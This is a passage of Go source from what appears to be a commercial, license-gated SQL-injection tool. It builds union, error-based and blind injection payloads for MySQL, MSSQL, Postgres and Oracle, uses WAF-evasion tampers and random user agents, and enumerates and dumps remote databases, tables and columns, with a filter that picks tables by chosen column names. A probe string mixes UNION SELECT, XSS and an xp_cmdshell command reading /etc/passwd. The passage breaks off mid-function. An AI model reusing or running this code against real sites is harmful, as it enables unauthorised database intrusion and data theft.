package injection

import (
	"encoding/hex"
	"errors"
	"fmt"
	"git.quartzinc.dev/Zertex/XDGv2/auth"
	"git.quartzinc.dev/Zertex/XDGv2/injection/mssql"
	"git.quartzinc.dev/Zertex/XDGv2/injection/mysql"
	"git.quartzinc.dev/Zertex/XDGv2/injection/oracle"
	"git.quartzinc.dev/Zertex/XDGv2/injection/postgres"
	"git.quartzinc.dev/Zertex/XDGv2/manager"
	"git.quartzinc.dev/Zertex/XDGv2/tamper"
	"git.quartzinc.dev/Zertex/XDGv2/utils"
	"git.quartzinc.dev/Zertex/XDGv2/waf"
	"github.com/alecthomas/geoip"
	"github.com/corpix/uarand"
	"github.com/spf13/viper"
	"github.com/therecipe/qt/widgets"
	"net"
	"net/url"
	"path"
	"regexp"
	"strconv"
	"strings"
	"sync"
)

var (
	InjectableSkipped = errors.New("injectable skipped")
	QueryFailed = errors.New("query failed")
	UnknownColumn = errors.New("unknown column")
)

var TestPayload = "') AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert(\"XSS\")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#"

var U_Vectors = map[string]string {
	"single": "",
	"multi": "",
}

var B_Vectors = map[string] string {
	"gen_and_where": "%s AND %s %s",
	"gen_or_where": "%s OR %s %s",
	"gen_or_not_where": "%s OR NOT %s %s",
	"gen_and_where_sub": "%s AND 8839=(CASE WHEN (%s) THEN 8839 ELSE (SELECT 2918 UNION SELECT 4141) END))%s",
	"gen_or_where_sub": "%s OR 8839=(CASE WHEN (%s) THEN 8839 ELSE (SELECT 2918 UNION SELECT 4141) END))%s",
	"gen_rep": "%s(SELECT (CASE WHEN (%s) THEN 1 ELSE (SELECT 9175 UNION SELECT 7580) END))%s",
	"gen_having": "%s HAVING %s%s",
}

var Modulators = [][]string {
	{"", ""},
	{"", "#"},
	{"", "# %s"},
	{"'", "# %s"},
	{"", "-- %s"},
	{"'", "-- %s"},
	{"'", "-- -"},
	{")", "# %s"},
	{")", "-- %s"},
	{")", "-- -"},
	{"", " AND %d=%d"},
	{")", " AND (%d=%d"},
	{"", " AND \"%s\" LIKE \"%s"},
	{"\"", " AND \"%s\" LIKE \"%s"},
	{"\")", " AND (\"%s\" LIKE \"%s"},
	{""," AND '%d'='%d"},
	{"'"," AND '%d'='%d"},
	{"')"," AND ('%d'='%d"}, // 17

	{"))", " AND ((%d=%%d"},
	{")))", " AND (((%d=%d"},
	{"')", " AND ('%d'='%d"},
	{"'))", " AND (('%d'='%d"},
	{"')))", " AND ((('%d'='%d"},
	{"\"))", " AND ((\"%s\" LIKE \"%s"},
	{"\")))", " AND (((\"%s\" LIKE \"%s"},
	{"')", " AND ('%s' LIKE '%s"},
	{"'))", " AND (('%s' LIKE '%s"},
	{"')))", " AND ((('%s' LIKE '%s"}, // 27

	{"'))"," AND (('%d'='%d"},
	{"')))"," AND ((('%d'='%d"},
	{"AND %d'='%d'"," AND '%d'='%d"},
	{"AND %d'='%d')"," AND ('%d'='%d"},
	{"AND %d'='%d'))"," AND (('%d'='%d"},
	{"AND %d'='%d')))"," AND ((('%d'='%d"},
	{"AND %d=%d"," AND %d=%d"},
	{"AND %d=%d)"," AND (%d=%d"},
	{"AND %d=%d))"," AND ((%d=%d"},
	{"AND %d=%d)))"," AND (((%d=%d"}, // 37
	{"AND %d=%d", " AND %d=%d"},
}

func Init() {
	utils.LogInfo("Loading....")
	var values map[string]string
	for {
		if values = auth.AVar(); values != nil {
			break
		}
	}

	for name, val := range values {
		if strings.HasPrefix(name, "mysql_") {
			t := strings.Replace(name, "mysql_", "", -1)
			if _, ok := mysql.Queries[t]; ok {
				mysql.Queries[t] = val
			}
		}
		if strings.HasPrefix(name, "mysql_v_") {
			t := strings.Replace(name, "mysql_v_", "", -1)
			if _, ok := mysql.E_Vectors[t]; ok {
				mysql.E_Vectors[t] = val
			}
		}
		if strings.HasPrefix(name, "mssql_") {
			t := strings.Replace(name, "mssql_", "", -1)
			if _, ok := mssql.Queries[t]; ok {
				mssql.Queries[t] = val
			}
		}
		if strings.HasPrefix(name, "mssql_v_") {
			t := strings.Replace(name, "mssql_v_", "", -1)
			if _, ok := mssql.E_Vectors[t]; ok {
				mssql.E_Vectors[t] = val
			}
		}
		if strings.HasPrefix(name, "oracle_") {
			t := strings.Replace(name, "oracle_", "", -1)
			if _, ok := oracle.Queries[t]; ok {
				oracle.Queries[t] = val
			}
		}
		if strings.HasPrefix(name, "oracle_v_") {
			t := strings.Replace(name, "oracle_v_", "", -1)
			if _, ok := oracle.E_Vectors[t]; ok {
				oracle.E_Vectors[t] = val
			}
		}
		if strings.HasPrefix(name, "postgres_") {
			t := strings.Replace(name, "postgres_", "", -1)
			if _, ok := postgres.Queries[t]; ok {
				postgres.Queries[t] = val
			}
		}
		if strings.HasPrefix(name, "postgres_v_") {
			t := strings.Replace(name, "postgres_v_", "", -1)
			if _, ok := postgres.E_Vectors[t]; ok {
				postgres.E_Vectors[t] = val
			}
		}
		if strings.HasPrefix(name, "union_v_") {
			t := strings.Replace(name, "union_v_", "", -1)
			if _, ok := U_Vectors[t]; ok {
				U_Vectors[t] = val
			}
		}
	}
}

type StructureDatabase struct {
	Object *widgets.QTreeWidgetItem
	SIndex int
	Name string
	Selected bool
	Tables []StructureTable
}

func (sd *StructureDatabase) GetIndex() int {
	ind := 0
	for _,tb := range sd.Tables {
		ind += tb.Index
	}
	return ind
}

func (sd *StructureDatabase) GetTotalRows() int {
	to := 0
	for _, tb := range sd.Tables {
		to += tb.RowCount
	}
	return to
}

func (sd *StructureDatabase) GetColumnCount() int {
	c := 0
	for _, i := range sd.Tables {
		c += len(i.Columns)
	}
	return c
}

type StructureTable struct {
	Object *widgets.QTreeWidgetItem
	Name string
	Selected bool
	SIndex int
	Index int
	RowCount int
	Columns []StructureColumn
	Rows [][]string
}

func (st *StructureTable) GetColumnNameArray() []string {
	var names []string
	for _, col := range st.Columns {
		names = append(names, col.Name)
	}
	return names
}

type StructureColumn struct {
	Object *widgets.QTreeWidgetItem
	SIndex int
	Name string
	Type string
	Selected bool
}

type Injection struct {
	ID        int
	Vector    string
	Technique int
	Method    string
	Base      *url.URL
	Country   *geoip.Country
	Structure []StructureDatabase
	UILock    sync.RWMutex
	DBVersion string
	DBUser    string
	Prefix    string
	Suffix    string
	UserAgent string
	Parameter string
	Tampers   []string
	Original  string
	IP        string

	Databases int
	Tables    int
	Columns   int
	Rows      int

	UCount    int
	UInj      int
	Mod       int
	DBType    int
	Err       bool
	ChunkSize int
	Hex       bool
	Coalition bool
	Skip      chan interface{}
	SkipLock  sync.Mutex
	Errors    int
	FPD       string
	TotalRows int

	Status string
}

type Details struct {
	RowCount int
	TBIndex int
	DBIndex int
	Database string
	Table string
	Columns []string
}

func (inj *Injection) GetSystemDBNames() []string {
	switch inj.DBType {
	case MYSQL:
		return mysql.SystemDBNames
	case MSSQL:
		return mssql.SystemDBNames
	case POSTGRES:
		return postgres.SystemDBNames
	case ORACLE:
		return oracle.SystemDBNames
	default:
		return nil
	}
}

func GetTestVariables(dbms int) (string, *map[string]string) {
	var vec *map[string]string
	var testQuery string
	switch dbms {
	case MYSQL:
		testQuery = mysql.Queries["test"]
		vec = &mysql.E_Vectors
	case MSSQL:
		testQuery = mssql.Queries["test"]
		vec = &mssql.E_Vectors
	case POSTGRES:
		testQuery = postgres.Queries["test"]
		vec = &postgres.E_Vectors
	case ORACLE:
		testQuery = oracle.Queries["test"]
		vec = &oracle.E_Vectors
	}
	return testQuery, vec
}

func (inj *Injection) GetStructure(siteItem *widgets.QTreeWidgetItem, detailCh *chan Details, UILock *sync.RWMutex, filter map[string][]string) ([]StructureDatabase, error) {
	dbCount, err := inj.GetDatabaseCount()
	if err != nil {
		return nil, err
	}
	siteItem.SetText(1, fmt.Sprintf("%d", dbCount))

	dbWg := sync.WaitGroup{}
	dbSem := make(chan interface{}, 25)
	//inj.Structure = make([]StructureDatabase, dbCount-1)

	for dbIndex:=0; dbIndex < dbCount; dbIndex++ {
		dbI := dbIndex
		dbWg.Add(1)
		dbSem<-0
		go func(dbIndex int) {
			defer func() {
				dbWg.Done()
				<-dbSem
			}()
			database, err := inj.GetDatabase(dbIndex)
			if err != nil {
				return
			}
			if database == "information_schema" || database == "mysql" {
				return
			}

			UILock.Lock()
			dbItem := widgets.NewQTreeWidgetItem(0)
			dbItem.SetText(0, database)
			siteItem.AddChild(dbItem)
			UILock.Unlock()

			inj.Structure = append(inj.Structure, StructureDatabase{
				Object:	  dbItem,
				Name:     database,
				Selected: false,
				Tables:   nil,
			})
		}(dbI)
	}
	dbWg.Wait()

	tWG := sync.WaitGroup{}
	cWG := sync.WaitGroup{}
	tableSem := make(chan interface{}, 5)
	columnSem := make(chan interface{}, 5)

	if filter == nil {
		for dbIndex, dbItem := range inj.Structure {
			tbCount, err := inj.GetTableCount(dbItem.Name)
			if err != nil {
				panic(err)
			}
			inj.Structure[dbIndex].Object.SetText(1, fmt.Sprintf("%d", tbCount))
			inj.Structure[dbIndex].Tables = make([]StructureTable, tbCount)
			for tbIndex := 0; tbIndex < tbCount; tbIndex++ {
				tableSem <- 0
				tWG.Add(1)
				go func(tbIndex int, database string) {
					defer func() {
						<- tableSem
						tWG.Done()
					}()
					table, err := inj.GetTable(database, tbIndex)
					if err != nil {
						panic(err)
					}
					UILock.Lock()
					tbItem := widgets.NewQTreeWidgetItem(0)
					tbItem.SetText(0, table)
					inj.Structure[dbIndex].Object.AddChild(tbItem)
					UILock.Unlock()
					inj.Structure[dbIndex].Tables[tbIndex].Name = table
					inj.Structure[dbIndex].Tables[tbIndex].Object = tbItem

					inj.Structure[dbIndex].Tables[tbIndex].RowCount, err = inj.GetRowCount(database, table)
					if err != nil {
						panic(err)
					}

					cCount, err := inj.GetColumnCount(database, table)
					if err != nil {
						panic(err)
					}
					inj.Structure[dbIndex].Tables[tbIndex].Columns = make([]StructureColumn, cCount)
					inj.Structure[dbIndex].Tables[tbIndex].Object.SetText(1, fmt.Sprintf("%d", cCount))

					for cIndex := 0; cIndex < cCount; cIndex ++ {
						columnSem <- 0
						cWG.Add(1)
						go func(database, table string, cIndex int) {
							defer func() {
								<-columnSem
								cWG.Done()
							}()
							column, err := inj.GetColumn(database, table, cIndex)
							if err != nil {
								panic(err)
							}
							UILock.Lock()
							cItem := widgets.NewQTreeWidgetItem(0)
							cItem.SetText(0, column)
							inj.Structure[dbIndex].Tables[tbIndex].Object.AddChild(cItem)
							UILock.Unlock()
							inj.Structure[dbIndex].Tables[tbIndex].Columns[cIndex].Name = column
							inj.Structure[dbIndex].Tables[tbIndex].Columns[cIndex].Object = cItem
						}(database, table, cIndex)
					}
					cWG.Wait()
					*detailCh <- Details{
						RowCount: inj.Structure[dbIndex].Tables[tbIndex].RowCount,
						Database: database,
						Table:    table,
						Columns:  inj.Structure[dbIndex].Tables[tbIndex].GetColumnNameArray(),
					}
				}(tbIndex, dbItem.Name)
			}
			tWG.Wait()
		}
	} else {
		for dbIndex, dbItem := range inj.Structure {
			for _, fStr := range filter["0"] {
				hitCount, err := inj.GetTableCountWithColumn(dbItem.Name, fStr, nil)
				if err != nil {
					panic(err)
				}
				for hIndex := 0; hIndex < hitCount; hIndex++ {
					tWG.Add(1)
					tableSem <- 0
					go func(database, fStr string, dbIndex, hIndex int) {
						defer func() {
							<-tableSem
							tWG.Done()
						}()
						table, err := inj.GetTableWithColumn(database, fStr, hIndex, nil)
						if err != nil {
							panic(err)
						}

						tblItem := StructureTable{
							Name:     table,
							Selected: false,
							Index:    0,
							RowCount: 0,
							Columns:  make([]StructureColumn, len(filter)),
							Rows:     nil,
						}

						cIndex := 0
						for fIndex, fItem := range filter {
							cWG.Add(1)
							columnSem <- 0
							go func(database, table, fIndex string, fItem []string, cIndex int) {
								defer func() {
									cWG.Done()
									<-columnSem
								}()

								for _, fil := range fItem {
									col, err := inj.GetColumnFromTable(database, table, fil, nil)
									if err != nil {
										continue
									}
									if len(col) > 0 {
										tblItem.Columns[cIndex].Name = col
										break
									}
								}
							}(database, table, fIndex, fItem, cIndex)
							cIndex++
						}
						cWG.Wait()

						for _, k := range tblItem.Columns {
							if len(k.Name) == 0 {
								return
							}
						}
						UILock.Lock()
						tbItem := widgets.NewQTreeWidgetItem(0)
						tbItem.SetText(0, table)
						tbItem.SetText(1, fmt.Sprintf("%d", len(tblItem.Columns)))
						inj.Structure[dbIndex].Object.AddChild(tbItem)
						for cIndex, col := range tblItem.Columns {
							cItem := widgets.NewQTreeWidgetItem(0)
							cItem.SetText(0, col.Name)
							tbItem.AddChild(cItem)
							tblItem.Columns[cIndex].Object = cItem
						}
						UILock.Unlock()
						rC, err := inj.GetRowCount(database, table)
						if err != nil {
							return
						}
						tbItem.SetText(2, fmt.Sprintf("%d", rC))
						tblItem.Object = tbItem
						tblItem.RowCount = rC
						*detailCh <- Details{
							RowCount: rC,
							Database: database,
							Table:    table,
							Columns:  tblItem.GetColumnNameArray(),
						}
						inj.Structure[dbIndex].Tables = append(inj.Structure[dbIndex].Tables, tblItem)
					}(dbItem.Name, fStr, dbIndex, hIndex)
				}
				tWG.Wait()
			}
		}
	}

	return inj.Structure, nil
}

func (inj *Injection) GetDBCount() int {
	return len(inj.Structure)
}

func (inj *Injection) GetTotalTables() int {
	total := 0
	for _, dbItem := range inj.Structure {
		total += len(dbItem.Tables)
	}
	return total
}

func (inj *Injection) GetTotalColumns() int {
	total := 0
	for _, dbItem := range inj.Structure {
		for _, tbItem := range dbItem.Tables {
			total += len(tbItem.Columns)
		}
	}
	return total
}

func (inj *Injection) GetRows() int {
	total := 0
	for _, dbItem := range inj.Structure {
		for _, tbItem := range dbItem.Tables {
			total += tbItem.Index
		}
	}
	return total
}

func (inj *Injection) GetTotalRows() int {
	total := 0
	for _, dbItem := range inj.Structure {
		for _, tbItem := range dbItem.Tables {
			total += tbItem.RowCount
		}
	}
	return total
}

func (inj *Injection) GetCountry() (*geoip.Country, error) {
	if inj.Country != nil {
		return inj.Country, nil
	}

	geo, err := geoip.New()
	if err != nil {
		return nil, err
	}

	addrs, err := net.LookupHost(inj.Base.Hostname())
	if err != nil {
		return nil, err
	}

	if len(addrs) == 0 {
		return nil, errors.New("failed to find ip address")
	}

	inj.Country = geo.Lookup(net.ParseIP(addrs[0]))

	return inj.Country, nil
}

const (
	MYSQL = iota
	ORACLE
	POSTGRES
	MSSQL
)

const (
	UNION = iota
	ERROR
	BLIND
	STACKED
)

func (inj *Injection) GetChunkSize() (int, error) {
	if inj.ChunkSize != 0 {
		return inj.ChunkSize, nil
	}

	/*if inj.DBType != MYSQL {
		inj.ChunkSize = 395
		return inj.ChunkSize, nil
	}*/

	var query string
	switch inj.DBType {
	case MYSQL:
		query = "SELECT REPEAT(0x33,150)"
	case MSSQL:
		query = "SELECT REPLICATE(0x33,150)"
	case POSTGRES:
		query = "SELECT REPEAT(0x33,150)"
	case ORACLE:
		query = "SELECT REPEAT(0x33,150)"
	}

	for {
		payload, begin, _ := inj.BuildInjection(query, 1, false)
		_, body, err := manager.PManager.GetWithoutFailWithErrors(payload.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
		if err != nil {
			inj.Errors++
			return -1, err
		}

		inj.ChunkSize = utils.FindXPathChunk(body, begin)
		return inj.ChunkSize, nil
	}
}

func (inj *Injection) ToFormattedString() string {
	var a string
	var b string
	switch inj.Technique {
	case UNION:
		a = "[U]"
		var c []string
		for i:=0; i < inj.UCount; i++ {
			if i == inj.UInj {
				c = append(c, "i")
			} else {
				c = append(c, fmt.Sprintf("%d", i+1))
			}
		}
		b = strings.Join(c, ",")
	case ERROR:
		a = "[E]"
		var vecs map[string]string
		switch inj.DBType {
		case MYSQL:
			vecs = mysql.E_Vectors
		case MSSQL:
			vecs = mssql.E_Vectors
		case ORACLE:
			vecs = oracle.E_Vectors
		case POSTGRES:
			vecs = postgres.E_Vectors
		}
		for name, vec := range vecs {
			if vec == inj.Vector {
				b = name
				break
			}
		}
		b = fmt.Sprintf("%s!%s", b, inj.Method)
	case BLIND:
		a = "[B]"
		b = fmt.Sprintf("%d!%s!%.2f", inj.Mod, inj.Method, 0.0)
	}
	return fmt.Sprintf("%s %s %s %s %d %d", strings.ReplaceAll(inj.Base.String(), " ", "+"), inj.Parameter, a, b, inj.Mod, inj.DBType)
}

func ParseUrlString(str string) *Injection {
	parts := strings.Split(str, " ")
	if len(parts) < 5 {
		return nil
	}

	var inj *Injection

	dbType := -1
	if len(parts) != 6 {
		dbType = MYSQL
	} else {
		dbType, _ = strconv.Atoi(parts[5])
	}

	_u, err := url.Parse(parts[0])
	if err != nil {
		return nil
	}

	mod, err := strconv.Atoi(parts[4])
	if err != nil {
		return nil
	}

	if parts[2] == "[U]"{
		a := strings.Split(parts[3], ",")
		var i int
		for b, v := range a {
			if v == "i" {
				i = b
			}
		}

		inj = &Injection{
			Vector:    U_Vectors["multi"],
			Technique: UNION,
			Method:    "",
			Base:      _u,
			Prefix:    Modulators[mod][0],
			Suffix:    Modulators[mod][1],
			Parameter: parts[1],
			Tampers:   nil,
			//Original:  "",
			UCount:    len(a),
			UInj:      i,
			Mod:       mod,
			DBType:    dbType,
			Skip:      make(chan interface{}),
		}

	} else if parts[2] == "[E]" {
		var vec string
		p := strings.Split(parts[3], "!")
		var vecs map[string]string
		switch dbType {
		case MYSQL:
			vecs = mysql.E_Vectors
		case MSSQL:
			vecs = mssql.E_Vectors
		case ORACLE:
			vecs = oracle.E_Vectors
		case POSTGRES:
			vecs = postgres.E_Vectors
		}
		for name, vector := range vecs {
			if name == p[0] {
				vec = vector
				break
			}
		}
		inj = &Injection{
			Vector:    vec,
			Technique: ERROR,
			Method:    p[1],
			Base:      _u,
			Prefix:    Modulators[mod][0],
			Suffix:    Modulators[mod][1],
			Parameter: parts[1],
			Tampers:   nil,
			//Original:  "",
			UCount:    0,
			UInj:      0,
			Mod:       mod,
			DBType:    dbType,
			Skip:      make(chan interface{}),
		}
	} else if parts[2] == "[B]" {
		p := strings.Split(parts[3], "!")
		inj = &Injection{
			Vector:    "",
			Technique: BLIND,
			Method:    p[1],
			Base:      _u,
			Prefix:    Modulators[mod][0],
			Suffix:    Modulators[mod][1],
			Parameter: parts[1],
			Tampers:   nil,
			//Original:  "",
			UCount:    0,
			UInj:      0,
			Mod:       mod,
			DBType:    dbType,
			Skip:      make(chan interface{}),
		}
	}
	return inj
}

func (inj *Injection) BuildInjection(query string, index int, hex bool) (*url.URL, string, string) {
	payload, begin, end := BuildInjectionRaw(inj.Vector, query, inj.Method, inj.Prefix, inj.Suffix, inj.Technique, inj.DBType, inj.UCount, inj.UInj, index, inj.ChunkSize, hex, inj.Coalition)

	_u, _ := url.Parse(inj.Base.String())
	qu := inj.Base.Query()
	qu.Set(inj.Parameter, inj.Base.Query().Get(inj.Parameter) + " " + tamper.Tamper(payload, inj.Tampers))
	_u.RawQuery = qu.Encode()

	return _u, begin, end
}

func (inj *Injection) BuildUnionInjection(query string, secondary string, index int, hex bool) (string, string, string) {
	payload, begin, end := BuildInjectionRaw(inj.Vector, query, inj.Method, inj.Prefix, fmt.Sprintf("%s %s", secondary, inj.Suffix), inj.Technique, inj.DBType, inj.UCount, inj.UInj, index, inj.ChunkSize, hex, inj.Coalition)
	//utils.LogDebug(payload)

	u, _ := url.Parse(inj.Base.String())

	qu := u.Query()
	qu.Set(inj.Parameter, u.Query().Get(inj.Parameter) + " " + tamper.Tamper(payload, inj.Tampers))
	u.RawQuery = qu.Encode()


	return u.String(), begin, end
}

func BuildInjectionRaw(vector string, query string, method string, prefix string, suffix string, technique int, dbtype int, uc int, uic int, chunk int, cSize int, hex bool, coalition bool) (string, string, string) {
	var retVal string
	begin := utils.StringOfLength(4)
	end := utils.StringOfLength(4)
	prefix = ParseModulator(prefix)
	suffix = ParseModulator(suffix)

	if strings.HasPrefix(vector, "%s%s") {
		method = ""
		prefix = ""
		suffix = ""
	}

	if utils.Module == "Dumper" {
		if hex {
			query = strings.ReplaceAll(query, "SELECT MID(", "SELECT MID(HEX")
		}
	}

	if coalition && dbtype == MYSQL {
		if strings.Contains(query, "MID") {
			query = strings.ReplaceAll(query, "SELECT MID(", "SELECT UNHEX(HEX(MID(")
			query = strings.ReplaceAll(query, fmt.Sprintf(",%d,%d)", (chunk*cSize)+1, cSize), fmt.Sprintf(",%d,%d)))", (chunk*cSize)+1, cSize))
		} else {
			query = strings.ReplaceAll(query, "SELECT IFNULL(", "SELECT UNHEX(HEX(IFNULL(")
			query = strings.ReplaceAll(query, ",0x20)", ",0x20)))")
		}
	}

	switch technique {
	case ERROR:
		switch dbtype {
		case MYSQL:
			retVal = fmt.Sprintf(vector, prefix, method, utils.HexStr(begin), query, utils.HexStr(end), suffix)
		case MSSQL:
			retVal = fmt.Sprintf(vector, prefix, method, mssql.ConvertStringToChars(begin), query, mssql.ConvertStringToChars(end), suffix)
		case POSTGRES:
			retVal = fmt.Sprintf(vector, prefix, method, postgres.ConvertStringToChars(begin), query, postgres.ConvertStringToChars(end), suffix)
		case ORACLE:
			retVal = fmt.Sprintf(vector, prefix, method, oracle.ConvertStringToChars(begin), query, oracle.ConvertStringToChars(end), suffix)
		}
	case UNION:
		//var first string
		//var second string
		var payload string
		/*if strings.Contains(query, ") FROM") {
			queryParts := strings.Split(query, ") FROM")
			first = strings.TrimPrefix(fmt.Sprintf("%s)", queryParts[0]), "SELECT ")
			second = fmt.Sprintf("FROM %s", queryParts[1])
		} else if strings.Contains(query, " INTO") {
			queryParts := strings.Split(query, " INTO ")
			payload = queryParts[0]
			second = "INTO " + queryParts[1]
			goto skipConcat
		} else {
			first = query
			second = ""
		}*/
		switch dbtype {
		case MYSQL:
			payload = fmt.Sprintf("(SELECT CONCAT(0x%s,(%s),0x%s))", utils.HexStr(begin), query, utils.HexStr(end))
		case MSSQL:
			payload = fmt.Sprintf("(%s+(%s)+%s)", mssql.ConvertStringToChars(begin), query, mssql.ConvertStringToChars(end))
		case POSTGRES:
			payload = fmt.Sprintf("(%s||(%s)||%s)", postgres.ConvertStringToChars(begin), query, postgres.ConvertStringToChars(end))
		case ORACLE:
			payload = fmt.Sprintf("(%s||(%s)||%s)", oracle.ConvertStringToChars(begin), query, oracle.ConvertStringToChars(end))
		}
		//skipConcat:
		var nulls []string
		for i := 0; i < uc; i++ {
			if i == uic {
				nulls = append(nulls, payload)
			} else {
				nulls = append(nulls, "NULL")
			}
		}
		retVal = fmt.Sprintf(vector, prefix, strings.Join(nulls, ","), "", suffix)
	case BLIND:
		retVal = fmt.Sprintf(vector, prefix, query, suffix)
	}

	return retVal, begin, end
}

func WAFTest(_url string) (bool, string, float32, []string, string, int) {
	_, res, err := manager.PManager.Get(_url, uarand.GetRandom())
	if err != nil {
		return false, "", 0, nil, "", -1
	}

	PossibleDBMS := -1
	if viper.GetBool("exploiter.heuristics") && utils.Module != "Dumper" {
		u, err := url.Parse(_url)
		if err != nil {
			return false, "", 0, nil, "", -1
		}
		_u, _ := url.Parse(_url)
		b := false
		for param, vals := range u.Query() {
			uu := u.Query()
			uu.Set(param, fmt.Sprintf("%s%s", vals[0], TestPayload))
			_u.RawQuery = uu.Encode()
			_, body, err := manager.PManager.Get(_u.String(), uarand.GetRandom())
			if err != nil {
				return false, "", 0, []string{"space2comment"}, "", -1
			}
			b, PossibleDBMS = HasFlag(body)
			/*if viper.GetBool("exploiter.technique.blind") && utils.CompareTwoStrings(res, body) < .95 {
				b = true
			}*/
		}
		if !b {
			return false, "", 0, nil, "", -1
		}
	}

	resp, body, err := manager.PManager.Get(_url + url.QueryEscape(TestPayload), uarand.GetRandom())
	if err != nil {
		return true, res, 0, []string{"space2comment"}, "", PossibleDBMS
	}
	_, s := waf.IsWAF(resp, body)
	return true, res, 0/*utils.CompareTwoStrings(res, body)*/, s, resp.Request.RemoteAddr, PossibleDBMS
}

func HasFlag(body string) (bool, int) {
	for _, flag := range mysql.Flags {
		if strings.Contains(body, flag) {
			return true, MYSQL
		}
	}
	for _, flag := range mssql.Flags {
		if strings.Contains(body, flag) {
			return true, MSSQL
		}
	}
	for _, flag := range postgres.Flags {
		if strings.Contains(body, flag) {
			return true, POSTGRES
		}
	}
	for _, flag := range oracle.Flags {
		if strings.Contains(body, flag) {
			return true, ORACLE
		}
	}
	return false, -1
}

func (inj *Injection) GetWebServer() (string, error) {
	resp, _, err := manager.PManager.Get(inj.Base.String(), inj.UserAgent)
	if err != nil {
		return "N/A", err
	}
	return resp.Header.Get("Server"), nil
}

func (inj *Injection) GetIP() (net.IP, error) {
	addrs, err := net.LookupHost(inj.Base.Hostname())
	if err != nil {
		return nil, err
	}
	return net.ParseIP(addrs[0]), nil
}

func GetVectorName(vector string) string {
	for name, vec := range mysql.E_Vectors {
		if vec == vector {
			return name
		}
	}
	for name, vec := range mssql.E_Vectors {
		if vec == vector {
			return name
		}
	}
	for name, vec := range postgres.E_Vectors {
		if vec == vector {
			return name
		}
	}
	for name, vec := range oracle.E_Vectors {
		if vec == vector {
			return name
		}
	}
	for name, vec := range U_Vectors {
		if vec == vector {
			return name
		}
	}
	return "N/A"
}

func TechniqueString(tech int) string {
	switch tech {
	case ERROR: return "Error"
	case UNION: return "Union"
	case BLIND: return "Blind"
	case STACKED: return "Stacked"
	}
	return "N/A"
}

func DBMSString(db int) string {
	switch db {
	case MYSQL: return "MySQL"
	case MSSQL: return "MSSQL"
	case ORACLE: return "Oracle"
	case POSTGRES: return "PostGreSQL"
	}
	return "N/A"
}

func ParseModulator(mod string) string {
	return strings.ReplaceAll(strings.ReplaceAll(mod, "%s", utils.StringOfLength(4)), "%d", fmt.Sprintf("%d", 6538))
}

func (inj *Injection) BlindGetDataLength(query string) (int, error) {
	prefix := inj.Prefix
	if inj.Vector[0] == '(' {
		prefix = ""
	}
	for i:=1; i <= 32; i++ {
		payload, _, _ := BuildInjectionRaw(inj.Vector, query, "", prefix, fmt.Sprintf("=%d %s", i, inj.Suffix), BLIND, inj.DBType, 0, 0, 0, 1, false, false)

		_u, _ := url.Parse(inj.Base.String())
		qu := inj.Base.Query()
		qu.Set(inj.Parameter, inj.Base.Query().Get(inj.Parameter) + tamper.Tamper(payload, inj.Tampers))
		_u.RawQuery = qu.Encode()

		_, res, err := manager.PManager.GetWithoutFailWithErrors(_u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
		if err != nil {
			return 0, err
		}

		b, _ := HasFlag(res)
		if b /*|| utils.CompareTwoStrings(res, inj.Original) == inj.Per*/ {
			return i, nil
		}
	}
	return 0, errors.New("failed")
}

func (inj *Injection) BlindGetData(query string) (string, error) {
	l, err := inj.BlindGetDataLength(query)
	if err != nil {
		return "", err
	}

	prefix := inj.Prefix
	if inj.Vector[0] == '(' {
		prefix = ""
	}

	var output string
	for i:=0; i < l; i++ {
		for char := 32; char < 127; char++ {
			payload, _, _ := BuildInjectionRaw(inj.Vector, query, "", prefix, fmt.Sprintf("='%s' %s", string(rune(char)), inj.Suffix), BLIND, inj.DBType, 0, 0, i, 1, false, false)

			_u, _ := url.Parse(inj.Base.String())
			qu := inj.Base.Query()
			qu.Set(inj.Parameter, inj.Base.Query().Get(inj.Parameter)+tamper.Tamper(payload, inj.Tampers))
			_u.RawQuery = qu.Encode()

			_, res, err := manager.PManager.GetWithoutFailWithErrors(_u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				return "", err
			}

			b, _ := HasFlag(res)
			if b /*|| utils.CompareTwoStrings(res, inj.Original) == inj.Per*/ {
				output += string(rune(char))
			}
		}
	}
	return output, nil
}

func (inj *Injection) BlindGetInt(query string) (int, error) {
	s, err := inj.BlindGetData(query)
	if err != nil {
		return 0, err
	}
	return strconv.Atoi(s)
}

func (inj *Injection) GetDatabaseCount() (int, error) {
	for {
		select {
		case <-utils.Done:
			return -1, errors.New("exit early")
		case <-inj.Skip:
			return -1, InjectableSkipped
		default:
			var query string
			switch inj.DBType {
			case MYSQL:
				query = mysql.Queries["db_count"]
			case MSSQL:
				query = mssql.Queries["db_count"]
			case POSTGRES:
				query = postgres.Queries["db_count"]
			case ORACLE:
				query = oracle.Queries["db_count"]
			}

			if inj.Technique == BLIND {
				return inj.BlindGetInt(query)
			}

			u, begincap, endcap := inj.BuildInjection(query, 0, false)

			_, body, err := manager.PManager.GetWithoutFailWithErrors(u.String(), inj.UserAgent, &inj.Errors, &inj.Skip)
			if err != nil {
				inj.Errors++
				continue
			}

			if strings.Contains(body, "Illegal mix of collations for operation") {
				inj.Coalition = true
				continue
			}

			if strings.Count(body, begincap) > 0 && strings.Count(body, endcap) > 0 {
				return strconv.Atoi(removeAlpha.ReplaceAllString(utils.CleanOutput(utils.GetStringInBetween(body, begincap, endcap)), ""))
			}
		}
	}
}

func (inj *Injection) GetDatabase(index int) (string, error) {
	_index := 0
	output := ""
	for {
		select {
		case <-utils.Done:
			return "", errors.New("exit early")
		case <-inj.Skip:
			return "", InjectableSkipped
		default:
			var query string
			switch inj.DBType {
			case MYSQL:
				query = fmt.Sprintf(mysql.Queries["db_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, index)
			case MSSQL:
				query = fmt.Sprintf(mssql.Queries["db_name"], index, (inj.ChunkSize*_index)+1, inj.ChunkSize)
			case POSTGRES:
				query = fmt.Sprintf(postgres.Queries["db_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, index)
			case ORACLE:
				query = fmt.Sprintf(oracle.Queries["db_name"], (inj.ChunkSize*_index)+1, inj.ChunkSize, index)
			}

			if inj.Technique == BLIND {
				return inj.BlindGetData(query)
			}

			u, begincap, endcap := inj.BuildInjection(query, _index, false)

